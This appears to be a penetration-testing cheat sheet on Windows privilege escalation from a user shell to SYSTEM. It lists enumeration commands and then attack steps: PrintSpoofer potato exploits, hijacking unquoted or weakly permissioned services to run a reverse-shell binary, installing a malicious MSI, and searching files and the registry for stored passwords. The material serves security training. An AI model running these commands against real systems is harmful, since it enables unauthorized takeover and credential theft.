---
tool: Windows privilege escalation
slug: windows-privesc
kind: technique
stages: [installation]
category: Local admin / SYSTEM on Windows
platforms: [windows]
services: []
ports: []
tags: [privilege-escalation, services, token, seimpersonate, potato, autorun]
attack: [T1548.002, T1134.001, T1068]
summary: Routes from a user shell to SYSTEM on Windows: token privileges, weak services, unquoted paths, AlwaysInstallElevated, stored credentials and autoruns. Enumerate, then take the one that fits.
references:
  - HackTricks Windows privesc | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
  - GTFOBins (LOLBAS) | https://lolbas-project.github.io/
---

## Enumerate

```text
whoami /priv                              :: token privileges (the big ones below)
whoami /groups
systeminfo                                :: OS/patch level for kernel exploits
```

```powershell
# Service and registry misconfigs, then run winPEAS for the rest
Get-CimInstance Win32_Service | ? {$_.StartName -eq 'LocalSystem'} | select Name,PathName
# AlwaysInstallElevated (both keys = 1 -> install a malicious MSI as SYSTEM)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Or run [winPEAS](/cpts/#tool-peass) and start with the red findings.

## Common wins

```text
:: SeImpersonatePrivilege (service accounts) -> SYSTEM with a potato
PrintSpoofer.exe -i -c cmd      (or GodPotato / JuicyPotatoNG)

:: Unquoted service path with a writable folder -> drop your exe in the gap
sc qc "VulnSvc"     :: PathName: C:\Program Files\A B\svc.exe -> plant C:\Program.exe

:: Weak service permissions -> repoint the binary and restart
sc config VulnSvc binPath= "C:\Temp\rev.exe" && sc stop VulnSvc && sc start VulnSvc

:: AlwaysInstallElevated -> install a SYSTEM payload
msiexec /quiet /qn /i evil.msi
```

## Stored credentials

```text
:: Hunt for passwords left on disk / in config
findstr /si password *.txt *.ini *.config *.xml 2>nul
cmdkey /list                              :: saved creds -> runas /savecred
reg query HKLM /f password /t REG_SZ /s   :: registry autologon, VNC, etc.
```

## Notes

`whoami /priv` first: `SeImpersonatePrivilege` (a potato to SYSTEM) and `SeBackupPrivilege` (read any file, dump SAM) are the quickest wins. Match the finding to the technique rather than spraying exploits. Prefer a misconfig over a kernel exploit. Confirm with `whoami` and keep the evidence.
